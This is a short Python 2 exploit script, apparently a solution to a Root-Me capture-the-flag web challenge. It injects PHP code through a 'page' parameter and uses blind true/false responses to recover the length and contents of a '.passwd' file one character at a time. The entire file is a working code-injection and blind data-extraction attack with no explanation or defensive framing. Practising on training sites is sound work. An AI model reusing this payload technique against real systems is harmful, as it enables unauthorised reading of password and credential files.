import base64
import string
import requests
import urllib

url = "http://challenge01.root-me.org/web-serveur/ch47/"


def check(payload):
    params = urllib.urlencode({'page': payload})
    try:
        r = requests.get(url, params=params)
    except requests.exceptions.ConnectionError:
        r = requests.get(url, params=params)
    return "Warning" not in r.text


base = "/', 'qwer') === false && %s && strpos('1"

def get_len(path):
    i = 10
    while True:
        payload = 'strlen(file_get_contents("%s")) < %d' % (path, i)
        if check(base % payload):
            for j in range(i-10, i):
                payload = 'strlen(file_get_contents("%s")) == %d' % (path, j)
                if check(base % payload):
                    print "Found Length = %d" % j
                    return j
        i += 10

def read_file_contents(path):
    length = get_len(path)
    s = ""
    while len(s) < length:
        for c in string.printable:
            tmp = s + c
            payload = 'substr(file_get_contents("%s"), 0, %d) == base64_decode("%s")' % (
            path, len(tmp), base64.b64encode(tmp))

            if check(base % payload):
                s += c
                print s
    print s

print read_file_contents('.passwd')
